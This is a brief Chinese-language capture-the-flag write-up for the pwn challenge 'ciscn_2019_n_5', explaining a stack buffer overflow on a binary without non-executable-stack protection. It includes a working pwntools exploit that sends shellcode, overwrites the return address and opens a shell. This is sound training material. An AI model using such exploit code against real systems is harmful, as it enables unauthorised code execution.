---
title: "ciscn_2019_n_5"
description: ""
date: 2023-04-07T12:04:39+08:00
lastmod: 2023-04-07T12:04:39+08:00
draft: false
images: []
type: docs
weight: 986
toc: true
---

## 0x01 分析

![8b0d045a8e986b039802ea64b9eef03f](images/8b0d045a8e986b039802ea64b9eef03f.png)  

没有加栈不可执行保护

![eb773946b1dabc872dca2a03987309bd](images/eb773946b1dabc872dca2a03987309bd.png)  

主要逻辑就是溢出覆盖函数返回地址为shellcode地址

## 0x02 Exploit

```python
from pwn import*
context.arch = 'amd64'
o = process("./pwn")
payload = b'a'*0x28 + p64(0x601080)
o.sendline(asm(shellcraft.sh()))
o.sendline(payload)
o.interactive()

```

![fa33d8e465b9da0bdf1a2faa888a5231](images/fa33d8e465b9da0bdf1a2faa888a5231.png)

自行调试
